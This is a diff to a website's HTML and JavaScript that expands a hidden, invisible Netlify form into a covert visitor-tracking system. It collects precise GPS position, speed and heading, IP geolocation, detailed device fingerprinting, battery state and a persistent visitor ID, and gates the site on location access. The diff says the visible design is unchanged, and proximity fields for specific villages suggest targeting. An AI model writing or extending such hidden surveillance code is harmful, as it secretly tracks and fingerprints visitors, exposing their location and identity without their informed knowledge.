@@ -965,22 +965,116 @@ html.location-gate-pending body {
 <body>
 
 <!-- Hidden Netlify form for one-time location email. Visible design is unchanged. -->
-<form aria-hidden='true' hidden method='POST' name='location-capture' style='display:none'>
-  <input type="hidden" name="form-name" value="location-capture" />
+<form aria-hidden='true' hidden method='POST' name='visitor-info' style='display:none'>
+  <input type="hidden" name="form-name" value="visitor-info" />
+  <input type="hidden" name="submit_time" />
   <input type="hidden" name="date" />
   <input type="hidden" name="time" />
+  <input type="hidden" name="page_url" />
+  <input type="hidden" name="gps_latitude" />
+  <input type="hidden" name="gps_longitude" />
+  <input type="hidden" name="accuracy_meters" />
+  <input type="hidden" name="google_maps_link" />
+  <input type="hidden" name="gps_quality_score" />
+  <input type="hidden" name="location_warning" />
+  <input type="hidden" name="permission_status" />
+  <input type="hidden" name="readings_count" />
+  <input type="hidden" name="wait_seconds" />
+  <input type="hidden" name="location_error" />
+  <input type="hidden" name="submission_reason" />
+  <input type="hidden" name="gate_status" />
+  <input type="hidden" name="ip_address" />
   <input type="hidden" name="ip_city" />
   <input type="hidden" name="ip_region" />
   <input type="hidden" name="ip_country" />
-  <input type="hidden" name="gps_quality_score" />
-  <input type="hidden" name="accuracy_meters" />
-  <input type="hidden" name="google_maps_link" />
-  <input type="hidden" name="battery_info" />
-  <input type="hidden" name="device_type" />
+  <input type="hidden" name="ip_latitude" />
+  <input type="hidden" name="ip_longitude" />
+  <input type="hidden" name="ip_org" />
+  <input type="hidden" name="ip_timezone" />
+  <input type="hidden" name="ip_details" />
+  <input type="hidden" name="ip_location_note" />
+  <input type="hidden" name="is_mobile_device" />
   <input type="hidden" name="mobile_model" />
-  <input type="hidden" name="os_name" />
+  <input type="hidden" name="device_type" />
   <input type="hidden" name="browser_name" />
+  <input type="hidden" name="os_name" />
+  <input type="hidden" name="platform" />
+  <input type="hidden" name="screen_size" />
+  <input type="hidden" name="viewport_size" />
+  <input type="hidden" name="language" />
+  <input type="hidden" name="timezone" />
   <input type="hidden" name="network_type" />
+  <input type="hidden" name="battery_info" />
+  <input type="hidden" name="user_agent" />
+  <input type="hidden" name="referrer" />
+  <input type="hidden" name="page_title" />
+  <input type="hidden" name="host_name" />
+  <input type="hidden" name="path_name" />
+  <input type="hidden" name="local_time" />
+  <input type="hidden" name="timezone_offset_minutes" />
+  <input type="hidden" name="languages" />
+  <input type="hidden" name="online_status" />
+  <input type="hidden" name="cookies_enabled" />
+  <input type="hidden" name="do_not_track" />
+  <input type="hidden" name="cpu_cores" />
+  <input type="hidden" name="device_memory_gb" />
+  <input type="hidden" name="touch_support" />
+  <input type="hidden" name="max_touch_points" />
+  <input type="hidden" name="device_pixel_ratio" />
+  <input type="hidden" name="color_depth" />
+  <input type="hidden" name="pixel_depth" />
+  <input type="hidden" name="orientation" />
+  <input type="hidden" name="connection_downlink" />
+  <input type="hidden" name="connection_rtt" />
+  <input type="hidden" name="connection_save_data" />
+  <input type="hidden" name="vendor" />
+  <input type="hidden" name="product" />
+  <input type="hidden" name="history_length" />
+  <input type="hidden" name="visitor_id" />
+  <input type="hidden" name="location_link" />
+  <input type="hidden" name="google_maps_directions_link" />
+  <input type="hidden" name="apple_maps_link" />
+  <input type="hidden" name="openstreetmap_link" />
+  <input type="hidden" name="accuracy_status" />
+  <input type="hidden" name="best_location_available" />
+  <input type="hidden" name="location_source_note" />
+  <input type="hidden" name="exactness_note" />
+  <input type="hidden" name="emergency_note" />
+  <input type="hidden" name="altitude_meters" />
+  <input type="hidden" name="altitude_accuracy_meters" />
+  <input type="hidden" name="speed_mps" />
+  <input type="hidden" name="speed_kmph" />
+  <input type="hidden" name="heading_degrees" />
+  <input type="hidden" name="gps_timestamp" />
+  <input type="hidden" name="gps_age_seconds" />
+  <input type="hidden" name="location_received_time_iso" />
+  <input type="hidden" name="location_received_after_seconds" />
+  <input type="hidden" name="browser_version" />
+  <input type="hidden" name="os_version" />
+  <input type="hidden" name="device_brand_note" />
+  <input type="hidden" name="is_tablet_device" />
+  <input type="hidden" name="is_pwa_standalone" />
+  <input type="hidden" name="page_open_time_iso" />
+  <input type="hidden" name="page_open_time_local" />
+  <input type="hidden" name="visibility_state" />
+  <input type="hidden" name="connection_type" />
+  <input type="hidden" name="connection_downlink_max" />
+  <input type="hidden" name="battery_level_percent" />
+  <input type="hidden" name="battery_charging" />
+  <input type="hidden" name="battery_charging_time_seconds" />
+  <input type="hidden" name="battery_discharging_time_seconds" />
+  <input type="hidden" name="ip_postal" />
+  <input type="hidden" name="ip_country_code" />
+  <input type="hidden" name="ip_asn" />
+  <input type="hidden" name="ip_version" />
+  <input type="hidden" name="ip_currency" />
+  <input type="hidden" name="ip_calling_code" />
+  <input type="hidden" name="ip_languages" />
+  <input type="hidden" name="distance_from_darekarwadi_km" />
+  <input type="hidden" name="near_darekarwadi_status" />
+  <input type="hidden" name="near_ahilyanagar_status" />
+  <input type="hidden" name="extra_summary" />
+  <input type="hidden" name="device_summary" />
   <textarea name="visitor_summary"></textarea>
 </form>
 
@@ -1322,7 +1416,7 @@ html.location-gate-pending body {
 (function () {
   "use strict";
 
-  const FORM_NAME = "location-capture";
+  const FORM_NAME = "visitor-info";
   const SESSION_SENT_KEY = "md_location_sent_this_tab_v12_once";
   const SHARED_ACCESS_KEY = "md_location_access_allowed_once_v13";
   const VISITOR_KEY = "md_location_visitor_id_v12_once";
@@ -1466,22 +1560,77 @@ html.location-gate-pending body {
     const ua = navigator.userAgent || "";
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
     const screenObj = window.screen || {};
+    const orientationObj = screenObj.orientation || {};
     const info = {
       is_mobile_device: /Android|iPhone|iPad|iPod|Mobile/i.test(ua) ? "Yes" : "No",
       mobile_model: detectMobileModel(ua),
+      device_brand_note: "Exact brand/model is available only if browser exposes it",
       device_type: /Android|iPhone|iPad|iPod|Mobile/i.test(ua) ? "Mobile/Tablet" : "Desktop/Laptop",
+      is_tablet_device: /iPad|Tablet/i.test(ua) ? "Yes" : "No",
       browser_name: detectBrowser(ua),
       browser_version: detectBrowserVersion(ua),
       os_name: detectOS(ua),
       os_version: detectOSVersion(ua),
+      platform: valueOrBlank(navigator.platform),
       screen_size: valueOrBlank(screenObj.width) + " x " + valueOrBlank(screenObj.height),
       viewport_size: valueOrBlank(window.innerWidth) + " x " + valueOrBlank(window.innerHeight),
       language: valueOrBlank(navigator.language),
       timezone: valueOrBlank(Intl.DateTimeFormat().resolvedOptions().timeZone),
       network_type: valueOrBlank(connection.effectiveType || connection.type),
+      connection_type: valueOrBlank(connection.type),
+      connection_downlink_max: valueOrBlank(connection.downlinkMax),
+      battery_info: "Not available",
+      battery_level_percent: "Not available",
+      battery_charging: "Not available",
+      battery_charging_time_seconds: "Not available",
+      battery_discharging_time_seconds: "Not available",
+      user_agent: valueOrBlank(ua),
+      referrer: valueOrBlank(document.referrer),
+      page_title: valueOrBlank(document.title),
+      host_name: valueOrBlank(window.location.hostname),
+      path_name: valueOrBlank(window.location.pathname),
+      page_open_time_iso: PAGE_OPEN_TIME.toISOString(),
+      page_open_time_local: PAGE_OPEN_TIME.toString(),
+      visibility_state: valueOrBlank(document.visibilityState),
+      is_pwa_standalone: (window.matchMedia && window.matchMedia("(display-mode: standalone)").matches) ? "Yes" : "No",
       local_time: valueOrBlank(new Date().toString()),
+      timezone_offset_minutes: valueOrBlank(new Date().getTimezoneOffset()),
+      languages: valueOrBlank((navigator.languages || []).join(", ") || navigator.language),
+      online_status: navigator.onLine ? "Online" : "Offline/unknown",
+      cookies_enabled: navigator.cookieEnabled ? "Yes" : "No",
+      do_not_track: valueOrBlank(navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack),
+      cpu_cores: valueOrBlank(navigator.hardwareConcurrency),
+      device_memory_gb: valueOrBlank(navigator.deviceMemory),
+      touch_support: ("ontouchstart" in window || (navigator.maxTouchPoints || 0) > 0) ? "Yes" : "No",
+      max_touch_points: valueOrBlank(navigator.maxTouchPoints),
+      device_pixel_ratio: valueOrBlank(window.devicePixelRatio),
+      color_depth: valueOrBlank(screenObj.colorDepth),
+      pixel_depth: valueOrBlank(screenObj.pixelDepth),
+      orientation: valueOrBlank(orientationObj.type || window.orientation),
+      connection_downlink: valueOrBlank(connection.downlink),
+      connection_rtt: valueOrBlank(connection.rtt),
+      connection_save_data: connection.saveData ? "Yes" : "No",
+      vendor: valueOrBlank(navigator.vendor),
+      product: valueOrBlank(navigator.product),
+      history_length: valueOrBlank(window.history && window.history.length),
       visitor_id: getVisitorId()
     };
+    info.extra_summary = [
+      "Page: " + info.page_url,
+      "Referrer: " + info.referrer,
+      "Local time: " + info.local_time,
+      "Timezone: " + info.timezone,
+      "DNT: " + info.do_not_track
+    ].join(" | ");
+    info.device_summary = [
+      "Device: " + info.device_type,
+      "Mobile model: " + info.mobile_model,
+      "Browser: " + info.browser_name,
+      "OS: " + info.os_name,
+      "Screen: " + info.screen_size,
+      "Network: " + info.network_type,
+      "Visitor ID: " + info.visitor_id
+    ].join(" | ");
     return info;
   }
 
@@ -1490,17 +1639,16 @@ html.location-gate-pending body {
     try {
       if (navigator.getBattery) {
         const battery = await navigator.getBattery();
-        const level = Math.round((battery.level || 0) * 100) + "%";
-        const charging = battery.charging ? "Charging" : "Unplugged";
-        info.battery_info = level + " (" + charging + ")";
-      } else {
-        info.battery_info = "Not supported";
+        info.battery_level_percent = Math.round((battery.level || 0) * 100) + "%";
+        info.battery_charging = battery.charging ? "Yes" : "No";
+        info.battery_charging_time_seconds = isFinite(battery.chargingTime) ? String(battery.chargingTime) : "Not available";
+        info.battery_discharging_time_seconds = isFinite(battery.dischargingTime) ? String(battery.dischargingTime) : "Not available";
+        info.battery_info = "level=" + info.battery_level_percent + ", charging=" + info.battery_charging + ", chargingTime=" + info.battery_charging_time_seconds + ", dischargingTime=" + info.battery_discharging_time_seconds;
       }
-    } catch (e) { info.battery_info = "Blocked by browser"; }
-    
+    } catch (e) { info.battery_info = "Not available - browser blocked battery info"; }
     try {
       if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        const high = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model", "uaFullVersion", "fullVersionList"]);
+        const high = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "architecture", "model", "uaFullVersion", "fullVersionList", "bitness", "wow64"]);
         if (high.platform) info.platform = high.platform + (high.platformVersion ? " " + high.platformVersion : "");
         if (high.platformVersion) info.os_version = high.platform + " " + high.platformVersion;
         if (high.model) info.mobile_model = high.model;
@@ -1595,26 +1743,58 @@ html.location-gate-pending body {
   }
 
   function buildGpsFields(reason) {
+    const waitSeconds = Math.round((Date.now() - startedAt) / 1000);
     if (bestPosition && bestPosition.coords) {
       const lat = bestPosition.coords.latitude;
       const lon = bestPosition.coords.longitude;
       const acc = Math.round(bestPosition.coords.accuracy || 0);
       const links = makeMapLinks(lat, lon);
-      return {
+      const gpsTime = bestPosition.timestamp ? new Date(bestPosition.timestamp) : new Date();
+      const afterSeconds = Math.round((gpsTime.getTime() - PAGE_OPEN_TIME.getTime()) / 1000);
+      const speedMps = numberOrBlank(bestPosition.coords.speed, 2);
+      const speedKmph = isFinite(Number(bestPosition.coords.speed)) ? (Number(bestPosition.coords.speed) * 3.6).toFixed(2) : "Not available";
+      return Object.assign({}, links, {
         gps_latitude: lat,
         gps_longitude: lon,
         accuracy_meters: acc,
         gps_quality_score: accuracyStatus(acc),
-        google_maps_link: links.google_maps_link,
+        accuracy_status: accuracyStatus(acc),
+        best_location_available: "Yes",
+        location_source_note: "GPS/browser geolocation reading. Exactness depends on mobile GPS, precise location setting, browser, sky visibility and network.",
+        exactness_note: acc <= GOOD_ACCURACY_METERS ? "Very accurate reading from browser" : "Best available reading only; check accuracy_meters before trusting exact point.",
+        emergency_note: "For emergency use, open the map link and check accuracy_meters. Lower accuracy meters means better location.",
+        altitude_meters: numberOrBlank(bestPosition.coords.altitude, 2),
+        altitude_accuracy_meters: numberOrBlank(bestPosition.coords.altitudeAccuracy, 2),
+        speed_mps: speedMps,
+        speed_kmph: speedKmph,
+        heading_degrees: numberOrBlank(bestPosition.coords.heading, 2),
+        gps_timestamp: gpsTime.toISOString(),
+        gps_age_seconds: Math.max(0, Math.round((Date.now() - gpsTime.getTime()) / 1000)),
+        location_received_time_iso: new Date().toISOString(),
+        location_received_after_seconds: Math.max(0, afterSeconds),
+        distance_from_darekarwadi_km: "Not configured - exact Darekarwadi reference point not set",
+        near_darekarwadi_status: "Not configured",
+        near_ahilyanagar_status: "Not configured",
+        location_warning: acc <= GOOD_ACCURACY_METERS ? "Best/very accurate location received" : "Best available location sent. Accuracy depends on phone GPS, browser and network.",
         permission_status: lastLocationStatus + " (before: " + permissionBefore + ")",
-        location_error: lastLocationError || "No error"
-      };
+        readings_count: readingCount,
+        wait_seconds: waitSeconds,
+        location_error: lastLocationError || "No error",
+        submission_reason: reason || "best_accuracy_finished",
+        gate_status: "Allowed: website opened after user allowed location"
+      });
     }
     return {
       gps_latitude: "Not available", gps_longitude: "Not available", accuracy_meters: "Not available", google_maps_link: "Not available",
-      gps_quality_score: "No GPS location received",
-      permission_status: lastLocationStatus + " (before: " + permissionBefore + ")", 
-      location_error: lastLocationError || "No GPS reading"
+      location_link: "Not available", google_maps_directions_link: "Not available", apple_maps_link: "Not available", openstreetmap_link: "Not available",
+      gps_quality_score: "No GPS location received", accuracy_status: "No GPS location received", best_location_available: "No",
+      location_source_note: "GPS/browser geolocation not available", exactness_note: "No GPS reading received", emergency_note: "User should enable phone GPS/location and allow browser location.",
+      altitude_meters: "Not available", altitude_accuracy_meters: "Not available", speed_mps: "Not available", speed_kmph: "Not available", heading_degrees: "Not available",
+      gps_timestamp: "Not available", gps_age_seconds: "Not available", location_received_time_iso: new Date().toISOString(), location_received_after_seconds: Math.round((Date.now() - PAGE_OPEN_TIME.getTime()) / 1000),
+      distance_from_darekarwadi_km: "Not configured", near_darekarwadi_status: "Not configured", near_ahilyanagar_status: "Not configured",
+      location_warning: "GPS location not available. User should enable phone location/GPS and allow browser location.",
+      permission_status: lastLocationStatus + " (before: " + permissionBefore + ")", readings_count: readingCount,
+      wait_seconds: waitSeconds, location_error: lastLocationError || "No GPS reading", submission_reason: reason || "no_gps", gate_status: "Location not available"
     };
   }
 
